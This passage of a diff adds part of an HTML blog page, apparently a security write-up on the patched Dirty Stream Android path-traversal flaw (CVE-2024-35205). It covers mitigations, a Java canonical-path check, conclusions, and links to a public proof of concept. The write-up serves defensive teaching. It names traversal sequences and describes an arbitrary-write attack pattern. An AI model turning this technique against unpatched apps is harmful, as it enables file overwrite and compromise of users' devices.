+    <div class="mitigation-card"><div class="mc-num">DEV / 02</div><div class="mc-title">Generate your own filenames</div><div class="mc-desc">Never use provider-supplied filenames for storage. Generate a UUID. The display name is for UI only.</div></div>
+    <div class="mitigation-card"><div class="mc-num">DEV / 03</div><div class="mc-title">Strip traversal sequences</div><div class="mc-desc">Sanitize <code>_display_name</code> — remove <code>../</code>, <code>./</code>, percent-encoded equivalents, and null bytes.</div></div>
+    <div class="mitigation-card"><div class="mc-num">DEV / 04</div><div class="mc-title">Restrict provider exports</div><div class="mc-desc">Set <code>android:exported="false"</code> or protect with a signature-level permission if third-party access isn't needed.</div></div>
+    <div class="mitigation-card"><div class="mc-num">USER / 05</div><div class="mc-title">Update immediately</div><div class="mc-desc">MI File Explorer patched post V1-210567. WPS Office patched in 17.0.0.</div></div>
+    <div class="mitigation-card"><div class="mc-num">USER / 06</div><div class="mc-title">Avoid unofficial APKs</div><div class="mc-desc">The exploit requires sideloading. Restricting installs to Google Play substantially raises the bar.</div></div>
+  </div>
+
+  <h3>The correct canonical path check</h3>
+  <pre data-lang="Java"><code><span class="kw">private</span> <span class="ty">File</span> <span class="fn">safeDestFile</span>(<span class="ty">String</span> providedName, <span class="ty">File</span> destDir)
+        <span class="kw">throws</span> <span class="ty">IOException</span> {
+
+    <span class="cm">// Option A: ignore provider name entirely — most robust</span>
+    <span class="kw">return new</span> <span class="ty">File</span>(destDir, <span class="ty">UUID</span>.randomUUID().toString());
+
+    <span class="cm">/* Option B: sanitize + validate
+    String safe = new File(providedName).getName(); // strip path components
+    File dest   = new File(destDir, safe);
+    if (!dest.getCanonicalPath().startsWith(
+            destDir.getCanonicalPath() + File.separator)) {
+        throw new SecurityException("Path traversal: " + providedName);
+    }
+    return dest; */
+}</code></pre>
+
+  <!-- 8 -->
+  <h2 id="conclusion">Conclusions &amp; Broader Pattern</h2>
+  <p>Dirty Stream is not a one-off MI File Explorer bug — it is a systemic pattern in how Android apps handle inter-process file sharing. Microsoft's team found the same flaw in WPS Office and anticipated correctly that it exists across many more apps.</p>
+  <p>What makes this class insidious is that it exploits <em>correct use of the API in one app against an incomplete implementation in another</em>. ContentProvider and FileProvider are not broken. The vulnerability lives in the gap between the server's documented contract and the client's common implementation.</p>
+  <p>The cyb3r-w0lf PoC is excellent educational material precisely because it strips the exploit to minimum viable form — two Java classes, one manifest entry, ~80 lines of code, and a reliable arbitrary write on every invocation against the unpatched target.</p>
+  <p>Any Android application that accepts files from other applications and uses the provider-supplied filename to determine where to cache that content is potentially vulnerable. The Android Developer documentation now explicitly addresses this under <em>Improperly trusting ContentProvider-provided filename</em> (updated September 2024).</p>
+
+  <div class="divider"></div>
+
+  <h3>References</h3>
+  <p style="font-size:.78rem;color:var(--text3);line-height:2.2;">
+    <a href="https://github.com/cyb3r-w0lf/Dirty_Stream-Android-POC" target="_blank" rel="noopener">github.com/cyb3r-w0lf/Dirty_Stream-Android-POC</a><br>
+    <a href="https://www.microsoft.com/en-us/security/blog/2024/05/01/dirty-stream-attack-discovering-and-mitigating-a-common-vulnerability-pattern-in-android-apps/" target="_blank" rel="noopener">Microsoft Security Blog — Dirty Stream Attack (May 2024)</a><br>
+    <a href="https://developer.android.com/privacy-and-security/risks/untrustworthy-contentprovider-provided-filename" target="_blank" rel="noopener">Android Docs — Improperly trusting ContentProvider-provided filename</a><br>
+    <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-35205" target="_blank" rel="noopener">NVD — CVE-2024-35205</a>
+  </p>
+
+</div>
+
+<footer class="blog-footer">
+  <p>Written for educational purposes only. This covers a <strong style="color:var(--green);">patched</strong> vulnerability.</p>
+  <a href="../index.html">← Back to Portfolio</a>
+</footer>
+
+</body>
+</html>
